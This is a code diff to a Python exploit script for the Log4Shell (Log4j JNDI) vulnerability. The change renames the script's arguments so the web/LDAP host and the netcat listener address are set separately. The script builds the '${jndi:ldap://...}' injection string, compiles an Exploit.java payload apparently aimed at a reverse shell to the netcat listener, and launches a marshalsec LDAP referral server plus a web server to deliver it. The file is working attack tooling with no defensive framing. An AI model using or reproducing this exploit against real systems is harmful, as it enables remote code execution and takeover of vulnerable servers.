@@ -20,7 +20,7 @@ def listToString(s):
       sys.exit()
     
 
-def payload(userip , webport , lport):
+def payload(webip , webport , ncip, ncport):
 
   genExploit = (
       """
@@ -60,7 +60,7 @@ public class Exploit {
     s.close();
   }
 }
-  """) % (userip, lport)
+  """) % (ncip, ncport)
 
   # writing the exploit to Exploit.java file 
 
@@ -77,7 +77,7 @@ public class Exploit {
   print(Fore.GREEN + '[+] Setting up LDAP server\n')
 
   # create the LDAP server on new thread
-  t1 = threading.Thread(target=createLdapServer, args=(userip,webport))
+  t1 = threading.Thread(target=createLdapServer, args=(webip,webport))
   t1.start()
 
   # start the web server
@@ -95,13 +95,13 @@ def checkJavaAvailible():
     sys.exit()
   
 
-def createLdapServer(userip, lport):
-  sendme = ("${jndi:ldap://%s:1389/a}") % (userip)
+def createLdapServer(webip, ncport):
+  sendme = ("${jndi:ldap://%s:1389/a}") % (webip)
   print(Fore.GREEN +"[+] Send me: "+sendme+"\n")
 
   subprocess.run(["./jdk1.8.0_20/bin/javac", "Exploit.java"])
 
-  url = "http://{}:{}/#Exploit".format(userip, lport)
+  url = "http://{}:{}/#Exploit".format(webip, ncport)
   subprocess.run(["./jdk1.8.0_20/bin/java", "-cp",
                  "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", url])
  
@@ -118,20 +118,21 @@ if __name__ == "__main__":
   try:
     parser = argparse.ArgumentParser(description='please enter the values ')
 
-    parser.add_argument('--userip', metavar='userip', type=str,
+    parser.add_argument('--webip', metavar='webip', type=str,
                         nargs='+', help='Enter IP for LDAPRefServer & Shell')
 
     parser.add_argument('--webport', metavar='webport', type=str,
                         nargs='+', help='listener port for HTTP port')
 
-    parser.add_argument('--lport', metavar='lport', type=str,
+    parser.add_argument('--ncip', metavar='ncip', type=str,
+                        nargs='+', help='Netcat IP')
+
+    parser.add_argument('--ncport', metavar='ncport', type=str,
                         nargs='+', help='Netcat Port')
 
     args = parser.parse_args()
 
-    #print(args.userip)
-
-    payload(listToString(args.userip), listToString(args.webport), listToString(args.lport))
+    payload(listToString(args.webip), listToString(args.webport), listToString(args.ncip), listToString(args.ncport))
 
   except KeyboardInterrupt:
     print(Fore.RED + "user interupted the program.")
